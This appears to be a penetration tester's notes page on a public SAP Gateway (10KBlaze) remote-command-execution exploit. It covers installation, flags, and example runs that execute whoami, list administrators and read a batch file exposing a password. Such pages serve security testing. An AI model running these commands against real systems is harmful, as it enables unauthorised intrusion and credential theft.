---
title : "SAP Gateway RCE"
# pre : ' '
description : "SAP Gateway RCE exploits. / SAP Gateway 10Kblaze Remote Code Execution."
date : 2025-05-21T15:14:02+02:00
# hidden : true
# draft : true
weight : 0
# tags : ['']
---

---

This PoC exploits an ACL misconfiguration in the SAP Gateway (port 33xx) that leads to a Remote Command Execution (RCE).

`SAPanonGWv1.py` is the first version of the exploit based on raw packets sent. It does not require any additional modules (Run and Pwn!).

`SAPanonGWv2.py` is the second version of the exploit based on the [pysap](https://github.com/SecureAuthCorp/pysap) library.

## Installation

```plain
git clone https://github.com/chipik/SAP_GW_RCE_exploit.git
```

## Usage

```plain
python2 SAPanonGWv1.py
```

## Flags

```plain
-t TARGET
-p PORT
-c CMD
-v VERBOSE
-o OUTPUT
```

## Examples

### WhoAmI

```plain
$ python2 SAPanonGWv1.py -t 10.10.10.10 -p 3300 -c whoami
[*] sending cmd:whoami
saphost\sapserviceadm
```

### Local Administrators Group

```plain
$ python2 SAPanonGWv1.py -t 10.10.10.10 -p 3300 -c "net localgroup administrators"                
[*] sending cmd:net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator

admlocal
crypt0rr
The command completed successfully.
```

### Files via PowerShell

```plain
$ python2 SAPanonGWv1.py -t 10.10.10.10 -p 3300 -c "powershell.exe -c type c:\SAP\stop_sap.bat"
[*] sending cmd:powershell.exe -c type c:\SAP\Stop_sap.bat
@Echo ATTENTION - YOU ARE GOING TO STOP SAP
PAUSE
sapcontrol -nr 00 -user sapserviceadm Welkom1234! -function Stop
```

## URL list

- [Github.com - SAP GW RCE Exploit](https://github.com/chipik/SAP_GW_RCE_exploit)
- [Cisa.gov - New Exploits for Unsecure SAP Systems](https://www.cisa.gov/news-events/cybersecurity-advisories/aa19-122a)
- [Nessus.com - SAP Gateway 10KBlaze Remote Code Execution](https://www.tenable.com/plugins/nessus/126003)
